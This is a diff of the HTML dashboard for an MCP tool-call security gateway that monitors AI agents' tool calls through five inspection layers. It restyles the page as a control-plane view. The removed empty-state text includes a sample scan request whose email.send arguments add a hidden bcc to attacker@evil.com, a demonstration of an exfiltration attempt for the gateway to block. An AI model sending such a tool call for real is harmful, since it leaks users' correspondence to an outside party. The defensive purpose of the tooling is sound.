@@ -1,319 +1,62 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MCP Security Gateway</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/0.160.0/three.min.js" onerror="window.__three=1"></script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MCP Gateway Control Plane</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-:root{
-  --bg:#0b0e14;--bg2:#0f131b;--panel:#12161f;--panel2:#161b26;--hover:#1a2130;
-  --line:#1f2632;--line2:#2a3340;
-  --tx:#eceff4;--tx2:#9aa5b5;--tx3:#5f6b7d;
-  --accent:#4b8bff;--accent2:#6ba3ff;
-  --red:#f0496e;--orange:#ff9f45;--yellow:#f5c451;--green:#31c48d;--teal:#2dd4bf;
-  --mono:'JetBrains Mono',monospace;--sans:'Inter',-apple-system,sans-serif;
-}
-html,body{height:100%;overflow:hidden}
-body{font-family:var(--sans);background:var(--bg);color:var(--tx);font-size:13px;-webkit-font-smoothing:antialiased}
-.app{display:grid;grid-template-rows:56px 88px 1fr;height:100vh}
-
-/* ===== TOP BAR ===== */
-.top{display:flex;align-items:center;gap:20px;padding:0 20px;background:var(--bg2);border-bottom:1px solid var(--line)}
-.brand{display:flex;align-items:center;gap:10px}
-.mark{width:28px;height:28px;border-radius:7px;background:linear-gradient(135deg,var(--accent),#7c5cff);display:grid;place-items:center}
-.mark svg{width:16px;height:16px;fill:#fff}
-.brand .n{font-size:14px;font-weight:600;letter-spacing:-.2px}
-.mode{display:flex;align-items:center;gap:7px;padding:4px 11px;border-radius:6px;font-size:11px;font-weight:600;font-family:var(--mono);
-  background:rgba(49,196,141,.12);color:var(--green);border:1px solid rgba(49,196,141,.25)}
-.mode.demo{background:rgba(245,196,81,.12);color:var(--yellow);border-color:rgba(245,196,81,.25)}
-.mode .d{width:7px;height:7px;border-radius:50%;background:currentColor;animation:pulse 1.6s infinite}
-.top .right{margin-left:auto;display:flex;align-items:center;gap:14px}
-.conn{display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11px;color:var(--tx2)}
-.conn .d{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green)}
-.conn .d.off{background:var(--red);box-shadow:0 0 8px var(--red)}
-.conn .d.rec{background:var(--yellow);animation:pulse 1s infinite}
-.clock{font-family:var(--mono);font-size:12px;color:var(--tx3)}
-
-/* ===== KPI STRIP ===== */
-.kpis{display:grid;grid-template-columns:repeat(6,1fr);gap:1px;background:var(--line);border-bottom:1px solid var(--line)}
-.kpi{background:var(--bg2);padding:14px 18px;display:flex;flex-direction:column;gap:5px;position:relative}
-.kpi .kl{font-size:10px;color:var(--tx3);text-transform:uppercase;letter-spacing:.7px;font-weight:600}
-.kpi .kv{font-family:var(--mono);font-size:24px;font-weight:600;line-height:1;letter-spacing:-.5px}
-.kpi .kd{font-size:10px;color:var(--tx3)}
-.kpi.crit .kv{color:var(--red)}.kpi.ok .kv{color:var(--green)}.kpi.warn .kv{color:var(--orange)}.kpi.acc .kv{color:var(--accent2)}
-.kpi .spark{position:absolute;right:14px;top:14px;width:60px;height:26px}
-
-/* ===== MAIN ===== */
-.main{display:grid;grid-template-columns:1fr 340px;gap:1px;background:var(--line);overflow:hidden}
-.feedwrap{background:var(--bg);display:flex;flex-direction:column;overflow:hidden}
-.side{background:var(--bg);display:flex;flex-direction:column;overflow:hidden}
-
-/* table header */
-.feedhead{display:flex;align-items:center;gap:12px;padding:12px 18px;border-bottom:1px solid var(--line);background:var(--bg2)}
-.feedhead h2{font-size:12px;font-weight:600;letter-spacing:.3px}
-.feedhead .sub{font-size:11px;color:var(--tx3)}
-.feedhead .badge{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--green);display:flex;align-items:center;gap:6px}
-.feedhead .badge .d{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 1.4s infinite}
-
-/* SIEM table */
-.tablehead{display:grid;grid-template-columns:82px 78px 1fr 120px 68px 74px 90px;gap:12px;padding:9px 18px;
-  border-bottom:1px solid var(--line);font-size:10px;text-transform:uppercase;letter-spacing:.6px;color:var(--tx3);font-weight:600;background:var(--bg2)}
-.rows{flex:1;overflow-y:auto}
-.rows::-webkit-scrollbar{width:8px}.rows::-webkit-scrollbar-thumb{background:var(--line2);border-radius:4px}.rows::-webkit-scrollbar-track{background:var(--bg)}
-.erow{display:grid;grid-template-columns:82px 78px 1fr 120px 68px 74px 90px;gap:12px;padding:11px 18px;
-  border-bottom:1px solid var(--line);align-items:center;font-size:12px;transition:background .1s}
-.erow:hover{background:var(--hover)}
-.erow.enter{animation:slide .3s ease-out}
-.erow .c-time{font-family:var(--mono);font-size:11px;color:var(--tx3)}
-.chip{font-size:10px;font-weight:600;font-family:var(--mono);padding:3px 8px;border-radius:5px;text-align:center;letter-spacing:.3px;width:fit-content}
-.chip.critical{background:rgba(240,73,110,.14);color:var(--red)}
-.chip.high{background:rgba(255,159,69,.14);color:var(--orange)}
-.chip.medium{background:rgba(245,196,81,.14);color:var(--yellow)}
-.chip.low{background:rgba(49,196,141,.14);color:var(--green)}
-.c-tool{overflow:hidden}
-.c-tool .tn{font-weight:600;color:var(--tx);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.c-tool .tf{font-size:10px;color:var(--tx3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:1px}
-.c-src{font-family:var(--mono);font-size:11px;color:var(--tx2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.c-cat{font-size:11px;color:var(--tx2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.c-risk{font-family:var(--mono);font-size:13px;font-weight:600;text-align:right}
-.c-layer{font-family:var(--mono);font-size:11px;color:var(--tx2);text-align:center}
-.verdict{font-size:10px;font-weight:700;font-family:var(--mono);padding:4px 9px;border-radius:5px;text-align:center;letter-spacing:.4px;width:fit-content}
-.verdict.blk{background:rgba(240,73,110,.13);color:var(--red);border:1px solid rgba(240,73,110,.3)}
-.verdict.pass{background:rgba(49,196,141,.11);color:var(--green);border:1px solid rgba(49,196,141,.28)}
-.src-tag{display:inline-block;font-family:var(--mono);font-size:8px;padding:1px 5px;border-radius:3px;margin-left:6px;vertical-align:middle}
-.src-tag.live{background:rgba(75,139,255,.15);color:var(--accent2)}
-.src-tag.demo{background:rgba(245,196,81,.13);color:var(--yellow)}
-
-/* empty state */
-.empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;color:var(--tx3);text-align:center;padding:40px}
-.empty svg{width:52px;height:52px;stroke:var(--line2);fill:none;stroke-width:1.5}
-.empty h3{font-size:15px;color:var(--tx2);font-weight:600}
-.empty p{font-size:12px;max-width:440px;line-height:1.6}
-.empty code{font-family:var(--mono);font-size:11px;background:var(--panel2);padding:2px 7px;border-radius:4px;color:var(--accent2);border:1px solid var(--line)}
-.empty .curl{margin-top:6px;text-align:left;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px 16px;font-family:var(--mono);font-size:11px;color:var(--tx2);line-height:1.7;max-width:520px}
-.empty .curl .k{color:var(--teal)}
-
-/* side panels */
-.spanel{border-bottom:1px solid var(--line);padding:16px 18px}
-.spanel:last-child{flex:1;overflow:hidden;display:flex;flex-direction:column}
-.spanel h3{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:var(--tx3);font-weight:600;margin-bottom:14px;display:flex;align-items:center}
-.spanel h3 .t{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--tx2);text-transform:none;letter-spacing:0}
-
-/* 3D hero */
-#flow{width:100%;height:150px;border-radius:8px;background:radial-gradient(circle at 50% 45%,#0e1622,#0a0d13);display:block}
-
-/* layer funnel */
-.lrow{margin-bottom:12px}
-.lrow:last-child{margin-bottom:0}
-.ltop{display:flex;align-items:center;gap:8px;margin-bottom:5px}
-.ldot{width:9px;height:9px;border-radius:3px}
-.lname{font-size:12px;color:var(--tx);font-weight:500;flex:1}
-.lcount{font-family:var(--mono);font-size:13px;font-weight:600}
-.ltrack{height:6px;background:var(--panel2);border-radius:3px;overflow:hidden}
-.lfill{height:100%;border-radius:3px;transition:width .5s ease}
-
-/* vectors */
-.vecs{flex:1;overflow-y:auto}
-.vecs::-webkit-scrollbar{width:6px}.vecs::-webkit-scrollbar-thumb{background:var(--line2);border-radius:3px}
-.vec{margin-bottom:11px}
-.vtop{display:flex;align-items:center;gap:8px;margin-bottom:4px}
-.vdot{width:7px;height:7px;border-radius:2px}
-.vn{font-size:11px;color:var(--tx2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-transform:capitalize}
-.vc{font-family:var(--mono);font-size:11px;font-weight:600;color:var(--tx)}
-.vbar{height:4px;background:var(--panel2);border-radius:2px;overflow:hidden}
-.vbar i{display:block;height:100%;transition:width .5s}
-
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
-@keyframes slide{from{opacity:0;background:rgba(75,139,255,.08)}to{opacity:1}}
-@media(max-width:1100px){.main{grid-template-columns:1fr}.side{display:none}.kpis{grid-template-columns:repeat(3,1fr)}}
+:root{--bg:#081018;--panel:#0d1822;--panel2:#101e2a;--line:#213543;--muted:#89a0ae;--text:#e9f2f5;--blue:#4ea7ff;--teal:#32d4ba;--green:#44d17c;--amber:#ffbe4f;--orange:#ff8d45;--red:#fa5d72;--violet:#a780ff;--mono:Consolas,"Courier New",monospace;--sans:"Segoe UI",Arial,sans-serif}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font:13px var(--sans);min-width:320px}.app{min-height:100vh;display:grid;grid-template-rows:auto auto 1fr}.top{display:flex;align-items:center;gap:16px;padding:13px 20px;background:#09141e;border-bottom:1px solid var(--line)}.brand{display:flex;gap:11px;align-items:center;font-weight:700;letter-spacing:.35px}.shield{width:28px;height:28px;display:grid;place-items:center;border:1px solid var(--blue);border-radius:5px;color:var(--blue);font:700 15px var(--mono);box-shadow:inset 0 0 16px #1a5b883b}.subtitle{color:var(--muted);font-size:11px;font-weight:400}.right{margin-left:auto;display:flex;gap:12px;align-items:center;font:11px var(--mono);color:var(--muted)}.status{border:1px solid #356070;padding:5px 9px;border-radius:3px;letter-spacing:.5px}.status.demo{border-color:#835f1b;color:var(--amber);background:#ffbe4f0d}.status.external{border-color:#1b6e65;color:var(--teal);background:#32d4ba0d}.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px;background:var(--green);box-shadow:0 0 9px var(--green)}.dot.off{background:var(--red);box-shadow:0 0 9px var(--red)}
+.kpis{display:grid;grid-template-columns:repeat(6,1fr);border-bottom:1px solid var(--line);background:var(--line);gap:1px}.kpi{background:#0a151f;padding:13px 18px;min-height:76px}.label{font:700 10px var(--mono);letter-spacing:.8px;color:var(--muted);text-transform:uppercase}.value{font:700 25px var(--mono);padding-top:6px}.detail{font-size:11px;color:var(--muted);padding-top:3px}.blue{color:var(--blue)}.red{color:var(--red)}.green{color:var(--green)}.amber{color:var(--amber)}
+.main{display:grid;grid-template-columns:minmax(0,1.55fr) minmax(320px,.8fr);gap:12px;padding:12px;max-width:1800px;width:100%;margin:auto}.panel{background:var(--panel);border:1px solid var(--line);border-radius:5px;min-width:0}.panelhead{padding:12px 14px;border-bottom:1px solid var(--line);display:flex;gap:9px;align-items:baseline}.panelhead h2{font-size:12px;margin:0;letter-spacing:.6px;text-transform:uppercase}.panelhead span{font:11px var(--mono);color:var(--muted)}.panelhead .tail{margin-left:auto}.control{padding:3px 6px;border:1px solid #315262;border-radius:2px;font:10px var(--mono);color:var(--teal)}
+.topology{height:282px;position:relative;overflow:hidden;background:radial-gradient(ellipse at 50% 55%,#123144 0,#0b1721 50%,#081018 100%);perspective:1000px}.topology:before{content:"";position:absolute;inset:18% -8% -45%;background:repeating-linear-gradient(90deg,#62b8d114 0 1px,transparent 1px 38px),repeating-linear-gradient(0deg,#62b8d112 0 1px,transparent 1px 38px);transform:rotateX(61deg) rotateZ(-2deg);transform-origin:50% 15%;border:1px solid #4a9fbb25}.topology:after{content:"ENFORCEMENT PLANE / DECISION PATH";position:absolute;left:16px;bottom:12px;color:#78a1b6;font:10px var(--mono);letter-spacing:1px}.rail{position:absolute;left:7%;right:7%;top:50%;height:2px;background:linear-gradient(90deg,#4ea7ff,#32d4ba,#a780ff,#4ea7ff,#ff8d45,#44d17c);box-shadow:0 0 14px #4ea7ff70;transform:translateY(-50%) translateZ(20px)}.nodes{position:absolute;inset:0 7%;display:grid;grid-template-columns:1.15fr repeat(5,1fr) 1.15fr;align-items:center;gap:7px;transform-style:preserve-3d}.node{position:relative;z-index:2;min-width:0;height:70px;padding:11px 8px 7px;background:linear-gradient(145deg,#183347,#0d1d29);border:1px solid #3e758c;border-radius:3px;box-shadow:8px 9px 0 #02080d88,0 0 17px #2b6d8a40;transform:rotateX(12deg) rotateY(-8deg);transition:transform .25s,border-color .25s,box-shadow .25s}.node:hover{transform:translateY(-5px) rotateX(8deg) rotateY(-5deg)}.node.hot{border-color:var(--red);box-shadow:8px 9px 0 #02080d88,0 0 23px #fa5d72a0}.node.allow{border-color:var(--green);box-shadow:8px 9px 0 #02080d88,0 0 23px #44d17c70}.node .id{font:700 10px var(--mono);color:var(--teal);letter-spacing:.5px}.node .name{font-weight:700;font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:5px}.node .metric{font:10px var(--mono);color:var(--muted);margin-top:4px}.packet{position:absolute;z-index:3;left:7%;top:50%;width:11px;height:11px;border-radius:50%;background:var(--blue);box-shadow:0 0 13px var(--blue);transform:translate(-50%,-50%) translateZ(48px);opacity:0;transition:left 1.1s cubic-bezier(.2,.7,.2,1),opacity .15s}.packet.run{opacity:1}.packet.block{background:var(--red);box-shadow:0 0 16px var(--red)}.packet.pass{background:var(--green);box-shadow:0 0 16px var(--green)}.topo-note{position:absolute;right:15px;bottom:11px;font:10px var(--mono);color:var(--muted);text-align:right}.topo-note b{color:var(--text)}
+.ops{display:grid;grid-template-columns:1fr 1fr;border-top:1px solid var(--line)}.ops section{padding:13px;border-right:1px solid var(--line)}.ops section:last-child{border-right:0}.ops h3{font:700 10px var(--mono);letter-spacing:.7px;text-transform:uppercase;color:var(--muted);margin:0 0 10px}.layerrow{display:grid;grid-template-columns:21px 1fr 38px;gap:7px;align-items:center;margin:7px 0;font-size:11px}.layerrow i{width:9px;height:9px;border-radius:2px}.bar{height:5px;background:#182833;border-radius:3px;overflow:hidden}.bar b{display:block;height:100%;border-radius:3px;transition:width .4s}.count{font:11px var(--mono);text-align:right}.breakdown{display:grid;grid-template-columns:1fr auto;gap:7px;margin:8px 0;font-size:11px;color:var(--muted)}.breakdown strong{font:11px var(--mono);color:var(--text)}
+.queue{padding:0 13px 10px;max-height:384px;overflow:auto}.event{display:grid;grid-template-columns:68px 1fr auto;gap:9px;padding:11px 0;border-bottom:1px solid #1c2d38}.event:last-child{border:0}.time{font:10px var(--mono);color:var(--muted)}.eventname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.eventdetail{font-size:10px;color:var(--muted);padding-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.tag{font:700 10px var(--mono);height:min-content;padding:3px 5px;border:1px solid;border-radius:2px}.tag.block{color:var(--red);border-color:#fa5d7270;background:#fa5d7212}.tag.pass{color:var(--green);border-color:#44d17c70;background:#44d17c12}.source{font:9px var(--mono);padding:1px 4px;margin-left:5px;border:1px solid #385364;border-radius:2px;color:var(--muted)}.source.demo{color:var(--amber);border-color:#765a2a}.empty{padding:28px 15px;color:var(--muted);font-size:12px;line-height:1.6}.empty code{color:var(--teal);font:11px var(--mono)}.footer-note{padding:10px 13px;border-top:1px solid var(--line);font-size:10px;color:var(--muted);line-height:1.5}.footer-note b{color:var(--text)}
+@media(max-width:1050px){.main{grid-template-columns:1fr}.kpis{grid-template-columns:repeat(3,1fr)}}@media(max-width:670px){.top{padding:11px;gap:8px}.subtitle,.clock{display:none}.kpis{grid-template-columns:repeat(2,1fr)}.kpi{padding:11px}.main{padding:7px;gap:7px}.nodes{inset:0 3%;gap:3px}.node{height:64px;padding:7px 4px}.node .name{font-size:9px}.node .metric{font-size:8px}.topology{height:245px}.ops{grid-template-columns:1fr}.ops section{border-right:0;border-bottom:1px solid var(--line)}}
 </style>
 </head>
 <body>
 <div class="app">
-  <!-- TOP -->
-  <header class="top">
-    <div class="brand">
-      <div class="mark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm0 10.5h7c-.5 4-3.2 7.7-7 8.9V12H5V6.3l7-3.1v8.3z"/></svg></div>
-      <span class="n">MCP Security Gateway</span>
-    </div>
-    <div class="mode" id="mode"><span class="d"></span><span id="mode-txt">LIVE FEED</span></div>
-    <div class="right">
-      <div class="conn"><span class="d" id="dot"></span><span id="conn-txt">connecting</span></div>
-      <div class="clock" id="clock">--:--:--</div>
-    </div>
-  </header>
-
-  <!-- KPIs -->
-  <div class="kpis">
-    <div class="kpi acc"><div class="kl">Tool Calls</div><div class="kv" id="k-total">0</div><div class="kd">scanned</div></div>
-    <div class="kpi crit"><div class="kl">Blocked</div><div class="kv" id="k-blocked">0</div><div class="kd" id="k-blocked-d">0 critical</div></div>
-    <div class="kpi ok"><div class="kl">Block Rate</div><div class="kv" id="k-rate">0%</div><div class="kd">of scanned traffic</div></div>
-    <div class="kpi"><div class="kl">Throughput</div><div class="kv" id="k-eps">0.0</div><div class="kd">calls / sec</div></div>
-    <div class="kpi warn"><div class="kl">Avg Risk</div><div class="kv" id="k-risk">0</div><div class="kd">score / 100</div></div>
-    <div class="kpi"><div class="kl">Uptime</div><div class="kv" id="k-uptime">0s</div><div class="kd">gateway</div></div>
-  </div>
-
-  <!-- MAIN -->
-  <div class="main">
-    <div class="feedwrap">
-      <div class="feedhead">
-        <h2>Live Event Stream</h2>
-        <span class="sub">real-time tool-call inspection</span>
-        <span class="badge"><span class="d"></span>STREAMING</span>
-      </div>
-      <div class="tablehead">
-        <span>Time</span><span>Severity</span><span>Tool / Finding</span><span>Category</span><span>Risk</span><span>Layer</span><span>Verdict</span>
-      </div>
-      <div class="rows" id="rows"></div>
-      <div class="empty" id="empty">
-        <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
-        <h3>Awaiting live traffic</h3>
-        <p>The gateway is running and ready. Route your agent's MCP tool calls through it to see live inspections here. Each call is evaluated by all 5 defense layers.</p>
-        <div class="curl">
-<span class="k">curl</span> -X POST http://localhost:8000/api/scan \<br>
-&nbsp;&nbsp;-H <span class="k">"Content-Type: application/json"</span> \<br>
-&nbsp;&nbsp;-d '{"name":"email.send","server_id":"postmark",<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"arguments":{"to":"u@x.com","bcc":"attacker@evil.com"}}'
-        </div>
-        <p style="font-size:11px">Or set <code>MCP_DEMO_MODE=1</code> to replay the built-in attack catalog.</p>
-      </div>
-    </div>
-
-    <div class="side">
-      <div class="spanel">
-        <h3>Attack Flow<span class="t" id="flow-status">idle</span></h3>
-        <canvas id="flow"></canvas>
-      </div>
-      <div class="spanel">
-        <h3>Layer Interceptions<span class="t" id="layer-total">0</span></h3>
-        <div class="lrow"><div class="ltop"><span class="ldot" style="background:#f5c451"></span><span class="lname">L1 · Registry</span><span class="lcount" id="l1c">0</span></div><div class="ltrack"><div class="lfill" id="l1f" style="background:#f5c451"></div></div></div>
-        <div class="lrow"><div class="ltop"><span class="ldot" style="background:#2dd4bf"></span><span class="lname">L2 · Proxy</span><span class="lcount" id="l2c">0</span></div><div class="ltrack"><div class="lfill" id="l2f" style="background:#2dd4bf"></div></div></div>
-        <div class="lrow"><div class="ltop"><span class="ldot" style="background:#a855f7"></span><span class="lname">L3 · Kernel</span><span class="lcount" id="l3c">0</span></div><div class="ltrack"><div class="lfill" id="l3f" style="background:#a855f7"></div></div></div>
-        <div class="lrow"><div class="ltop"><span class="ldot" style="background:#4b8bff"></span><span class="lname">L4 · Semantic</span><span class="lcount" id="l4c">0</span></div><div class="ltrack"><div class="lfill" id="l4f" style="background:#4b8bff"></div></div></div>
-        <div class="lrow"><div class="ltop"><span class="ldot" style="background:#ff9f45"></span><span class="lname">L5 · Egress</span><span class="lcount" id="l5c">0</span></div><div class="ltrack"><div class="lfill" id="l5f" style="background:#ff9f45"></div></div></div>
-      </div>
-      <div class="spanel">
-        <h3>Top Attack Vectors</h3>
-        <div class="vecs" id="vecs"></div>
-      </div>
-    </div>
-  </div>
+<header class="top"><div class="brand"><span class="shield">M</span><span>MCP GATEWAY CONTROL PLANE<br><span class="subtitle">Five-layer tool-call enforcement telemetry</span></span></div><div class="right"><span class="status external" id="mode"><span class="dot" id="dot"></span><span id="modeText">EXTERNAL TRAFFIC ONLY</span></span><span id="conn">connecting</span><span class="clock" id="clock">--:--:--</span></div></header>
+<section class="kpis">
+<div class="kpi"><div class="label">Inspections</div><div class="value blue" id="total">0</div><div class="detail" id="sources">0 external / 0 demo</div></div>
+<div class="kpi"><div class="label">Enforcement Blocks</div><div class="value red" id="blocked">0</div><div class="detail" id="critical">0 critical</div></div>
+<div class="kpi"><div class="label">Block Rate</div><div class="value amber" id="rate">0.0%</div><div class="detail">all decisions</div></div>
+<div class="kpi"><div class="label">Decision P95</div><div class="value green" id="p95">0.000 ms</div><div class="detail" id="latSamples">0 sampled decisions</div></div>
+<div class="kpi"><div class="label">Ingress Rate</div><div class="value blue" id="eps">0.0/s</div><div class="detail">rolling 5-second window</div></div>
+<div class="kpi"><div class="label">Gateway Uptime</div><div class="value" id="uptime">0s</div><div class="detail">realtime control plane</div></div>
+</section>
+<main class="main">
+<section class="panel"><div class="panelhead"><h2>Tool-call enforcement topology</h2><span>each packet is a recorded decision</span><span class="tail control" id="flowStatus">AWAITING TRAFFIC</span></div>
+<div class="topology"><div class="rail"></div><div class="packet" id="packet"></div><div class="nodes">
+<div class="node" id="n0"><div class="id">INGRESS</div><div class="name">MCP Agent</div><div class="metric" id="m0">0 submitted</div></div>
+<div class="node" id="n1"><div class="id">L1</div><div class="name">Registry</div><div class="metric" id="m1">0 intercepts</div></div>
+<div class="node" id="n2"><div class="id">L2</div><div class="name">Proxy Policy</div><div class="metric" id="m2">0 intercepts</div></div>
+<div class="node" id="n3"><div class="id">L3</div><div class="name">Kernel Guard</div><div class="metric" id="m3">0 intercepts</div></div>
+<div class="node" id="n4"><div class="id">L4</div><div class="name">Semantic Check</div><div class="metric" id="m4">0 intercepts</div></div>
+<div class="node" id="n5"><div class="id">L5</div><div class="name">Egress Policy</div><div class="metric" id="m5">0 intercepts</div></div>
+<div class="node" id="n6"><div class="id">EGRESS</div><div class="name">MCP Tool</div><div class="metric" id="m6">0 allowed</div></div>
+</div><div class="topo-note"><b id="lastDecision">No decisions recorded</b><br>packets stop at the blocking layer</div></div>
+<div class="ops"><section><h3>Layer interception distribution</h3><div id="layers"></div></section><section><h3>Operational attribution</h3><div class="breakdown"><span>External agent calls</span><strong id="external">0</strong></div><div class="breakdown"><span>Opt-in demo calls</span><strong id="demo">0</strong></div><div class="breakdown"><span>Active MCP servers</span><strong id="servers">0</strong></div><div class="breakdown"><span>Observed tool names</span><strong id="tools">0</strong></div><div class="breakdown"><span>Top blocked category</span><strong id="category">none</strong></div></section></div>
+</section>
+<aside class="panel"><div class="panelhead"><h2>Decision queue</h2><span class="tail" id="queueCount">0 retained</span></div><div class="queue" id="queue"><div class="empty" id="empty"><b>No MCP calls have reached this gateway.</b><br>Start an external feed with <code>POST /api/scan</code>, or explicitly start a local demonstration with <code>MCP_DEMO_MODE=1</code>. Demo events are marked and never presented as production traffic.</div></div><div class="footer-note"><b>Scope:</b> This page visualizes the FastAPI five-layer ingestion endpoint on port 8000. The stdlib production service on port 8080 exposes its own <code>/v1/*</code> API and metrics; it is not silently merged into this view.</div></aside>
+</main>
 </div>
-
 <script>
-const S={total:0,blocked:0,allowed:0,byLayer:{1:0,2:0,3:0,4:0,5:0},byCat:{},bySev:{CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0},
-  riskSum:0,lastCount:0,feed:0,connected:false,reconn:0,uptime:0,mode:'live'};
-const SEVCSS={CRITICAL:'#f0496e',HIGH:'#ff9f45',MEDIUM:'#f5c451',LOW:'#31c48d'};
-const SEVHEX={CRITICAL:0xf0496e,HIGH:0xff9f45,MEDIUM:0xf5c451,LOW:0x31c48d};
-const LAYC={1:'#f5c451',2:'#2dd4bf',3:'#a855f7',4:'#4b8bff',5:'#ff9f45'};
-const LAYHEX={1:0xf5c451,2:0x2dd4bf,3:0xa855f7,4:0x4b8bff,5:0xff9f45};
-const LAYR={1:0.85,2:1.25,3:1.65,4:2.05,5:2.45};
-const VECC=['#4b8bff','#a855f7','#2dd4bf','#ff9f45','#f0496e','#f5c451','#7c5cff','#31c48d','#38bdf8','#fb7185'];
-
-// ---------- compact 3D attack flow ----------
-let T_OK=!window.__three&&window.THREE,scene,cam,rndr,core,rings={},proj=[],burst=[],clk;
-function init3D(){
-  if(!T_OK)return;const THREE=window.THREE;const cv=document.getElementById('flow');
-  rndr=new THREE.WebGLRenderer({canvas:cv,antialias:true,alpha:true});rndr.setPixelRatio(Math.min(devicePixelRatio,2));
-  const resize=()=>{const w=cv.clientWidth,h=cv.clientHeight;rndr.setSize(w,h,false);cam.aspect=w/h;cam.updateProjectionMatrix()};
-  scene=new THREE.Scene();cam=new THREE.PerspectiveCamera(50,cv.clientWidth/cv.clientHeight,0.1,50);cam.position.set(0,1.4,5.4);
-  scene.add(new THREE.AmbientLight(0x8899bb,0.8));const p=new THREE.PointLight(0x4b8bff,60,30);p.position.set(-4,4,6);scene.add(p);
-  core=new THREE.Mesh(new THREE.IcosahedronGeometry(0.55,1),new THREE.MeshStandardMaterial({color:0x113040,emissive:0x31c48d,emissiveIntensity:.6,flatShading:true,metalness:.4,roughness:.3}));scene.add(core);
-  [1,2,3,4,5].forEach(l=>{const t=new THREE.Mesh(new THREE.TorusGeometry(LAYR[l],0.012,12,90),new THREE.MeshBasicMaterial({color:LAYHEX[l],transparent:true,opacity:.55}));t.rotation.x=Math.PI/2+(l-3)*0.1;scene.add(t);rings[l]={t,pulse:0}});
-  clk=new THREE.Clock();resize();addEventListener('resize',resize);anim();
-}
-function anim(){requestAnimationFrame(anim);if(!T_OK)return;const dt=clk.getDelta(),t=clk.getElapsedTime();
-  core.rotation.y+=0.005;core.rotation.x+=0.003;
-  for(const l in rings){const r=rings[l];r.t.rotation.z+=0.004*(l%2?1:-1);if(r.pulse>0){r.pulse-=dt*2;r.t.material.opacity=.55+Math.max(0,r.pulse)*.45}}
-  for(let i=proj.length-1;i>=0;i--){const p=proj[i];p.t+=p.sp;const cur=p.d*(1-p.t);
-    if(cur<=p.stop){const pos=p.dir.clone().multiplyScalar(p.stop);
-      if(p.blocked){mkBurst(pos,p.col);if(rings[p.layer])rings[p.layer].pulse=1}
-      else if(p.breach){mkBurst(new THREE.Vector3(0,0,0),0xf0496e);core.material.emissive.setHex(0xf0496e);setTimeout(()=>core.material.emissive.setHex(0x31c48d),500)}
-      /* benign allowed: absorbed by core silently — normal traffic */
-      scene.remove(p.m);proj.splice(i,1);continue}
-    p.m.position.copy(p.dir.clone().multiplyScalar(cur))}
-  for(let i=burst.length-1;i>=0;i--){const b=burst[i];b.life-=dt*1.8;const a=b.g.attributes.position.array;for(let j=0;j<b.n;j++){a[j*3]+=b.v[j].x;a[j*3+1]+=b.v[j].y;a[j*3+2]+=b.v[j].z}b.g.attributes.position.needsUpdate=true;b.p.material.opacity=Math.max(0,b.life);if(b.life<=0){scene.remove(b.p);burst.splice(i,1)}}
-  cam.position.x=Math.sin(t*0.15)*5.4;cam.position.z=Math.cos(t*0.15)*5.4;cam.lookAt(0,0,0);rndr.render(scene,cam);
-}
-function fly(e){if(!T_OK)return;const THREE=window.THREE;const th=Math.random()*Math.PI*2,ph=Math.acos(2*Math.random()-1),R=3.6;
-  const start=new THREE.Vector3(R*Math.sin(ph)*Math.cos(th),R*Math.sin(ph)*Math.sin(th)*0.5,R*Math.cos(ph));
-  const risk=e.risk_score||0;
-  const isThreat=e.blocked||risk>=25;               // benign, allowed traffic is NOT a threat
-  const isBreach=!e.blocked&&risk>=25;              // missed threat = real breach
-  // benign allowed calls: quiet green tracer to the core (normal activity), no burst/flash
-  const col=e.blocked?(SEVHEX[e.severity]||0xf5c451):(isBreach?0xf0496e:0x31c48d);
-  const m=new THREE.Mesh(new THREE.SphereGeometry(isThreat?0.07:0.045,8,8),new THREE.MeshBasicMaterial({color:col,transparent:true,opacity:isThreat?1:0.5}));m.position.copy(start);scene.add(m);
-  const stop=e.blocked&&e.blocked_by_layer?LAYR[e.blocked_by_layer]:0.45;
-  proj.push({m,dir:start.clone().normalize(),d:start.length(),stop,blocked:e.blocked,breach:isBreach,layer:e.blocked_by_layer,col,t:0,sp:0.03+Math.random()*0.015});
-  document.getElementById('flow-status').textContent='live';}
